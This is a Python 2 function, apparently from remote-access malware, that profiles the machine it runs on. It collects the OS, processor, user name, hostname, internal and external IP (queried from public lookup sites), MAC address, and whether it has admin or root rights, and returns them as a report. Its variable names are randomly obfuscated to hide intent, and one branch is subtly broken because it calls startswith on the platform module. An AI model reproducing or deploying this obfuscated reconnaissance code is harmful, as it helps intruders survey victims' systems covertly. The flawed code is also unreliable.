# -*- coding: utf-8 -*-
import ctypes
import getpass
import os
import platform
import socket
import urllib
import uuid
def JJyEbjrynmapUHJCDQUQjcshajVjEFwA(plat_type):
    axrLmYBImtIZFYJQCZzwrLnUeZUmSjvG = platform.platform()
    processor    = platform.processor()
    architecture = platform.architecture()[0]
    NkWrEjssJvYyTiOKgYKUOLHqcEwJaeQM = getpass.getuser()
    NKhnjgkrMEwWfQPwGAffvTPaLWcoaCTJ    = socket.gethostname()
    hEnWDTSPYgZPhFEWCqFcCtAeMYYJTfJW        = socket.getfqdn()
    yrsSlrMNkzzSQwGwarslgesYcQkQLWly = socket.gethostbyname(NKhnjgkrMEwWfQPwGAffvTPaLWcoaCTJ)
    DkmgdjylWSgbZajSisdjoXSLtyPDmkhS     = uuid.getnode()
    WksGWRNNfqSVwAdfWLdWLyBwQpXNdCAJ         = ':'.join(("%012X" % DkmgdjylWSgbZajSisdjoXSLtyPDmkhS)[RdbcCUIsZtHxsXlDMItGlnJDYoKYZhIy:RdbcCUIsZtHxsXlDMItGlnJDYoKYZhIy+2] for RdbcCUIsZtHxsXlDMItGlnJDYoKYZhIy in range(0, 12, 2))
    EXZWhHWlddyRvQAAAHGHztaFxwNTsgWF = [ 'ipinfo.io/ip', 'icanhazip.com', 'ident.me',
                   'ipecho.net/plain', 'myexternalip.com/raw' ]
    LdaudtDarQAPKJqAuQuGuHxEVXVuKaWZ = ''
    for ZdbdDcxafJkxVIFzvgrdCYAolZNpzPnH in EXZWhHWlddyRvQAAAHGHztaFxwNTsgWF:
        try:
            LdaudtDarQAPKJqAuQuGuHxEVXVuKaWZ = urllib.urlopen('http://'+ZdbdDcxafJkxVIFzvgrdCYAolZNpzPnH).read().rstrip()
        except IOError:
            pass
        if LdaudtDarQAPKJqAuQuGuHxEVXVuKaWZ and (6 < len(LdaudtDarQAPKJqAuQuGuHxEVXVuKaWZ) < 16):
            break
    kIxmhEXhJpYmzcOWkDAVvNxZRJkSFGHN = False
    if plat_type.startswith('win'):
        kIxmhEXhJpYmzcOWkDAVvNxZRJkSFGHN = ctypes.windll.shell32.IsUserAnAdmin() != 0
    elif plat_type.startswith('linux') or platform.startswith('darwin'):
        kIxmhEXhJpYmzcOWkDAVvNxZRJkSFGHN = os.getuid() == 0
    XpXhhWptuKsoQVPsItQuguWDaPtDlPyb = 'Yes' if kIxmhEXhJpYmzcOWkDAVvNxZRJkSFGHN else 'No'
    FnjGjyWfkYPeTnLcKvXixlmpkXidRCgS = '''
    System Platform     - {}
    Processor           - {}
    Architecture        - {}
    Hostname            - {}
    FQDN                - {}
    Internal IP         - {}
    External IP         - {}
    MAC Address         - {}
    Current User        - {}
    Admin Access        - {}
    '''.format(axrLmYBImtIZFYJQCZzwrLnUeZUmSjvG, processor, architecture,
    NKhnjgkrMEwWfQPwGAffvTPaLWcoaCTJ, hEnWDTSPYgZPhFEWCqFcCtAeMYYJTfJW, yrsSlrMNkzzSQwGwarslgesYcQkQLWly, LdaudtDarQAPKJqAuQuGuHxEVXVuKaWZ, WksGWRNNfqSVwAdfWLdWLyBwQpXNdCAJ, NkWrEjssJvYyTiOKgYKUOLHqcEwJaeQM, XpXhhWptuKsoQVPsItQuguWDaPtDlPyb)
    return FnjGjyWfkYPeTnLcKvXixlmpkXidRCgS
